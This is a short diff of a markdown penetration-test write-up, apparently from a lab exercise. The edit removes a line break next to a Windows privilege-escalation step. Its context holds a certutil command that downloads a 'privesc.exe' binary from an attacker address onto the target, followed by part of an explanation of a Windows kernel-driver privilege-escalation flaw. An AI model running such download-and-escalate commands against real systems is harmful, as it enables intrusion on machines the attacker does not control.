@@ -60,7 +60,6 @@ Machine with certutil: </br>
 ```bash
 certutil -urlcache -split -f "http://10.10.14.3/privesc.exe" privesc.exe
 ``` 
-</br>
 **Vulnerability Explanation:** The kernel-mode drivers in Microsoft Windows Vista SP2; Windows Server
 2008 SP2 and R2 SP1; Windows 7 SP1; Windows 8.1; Windows Server 2012 Gold and R2; Windows RT
 8.1; and Windows 10 Gold, 1511, and 1607 allow local users to gain privileges via a crafted application,
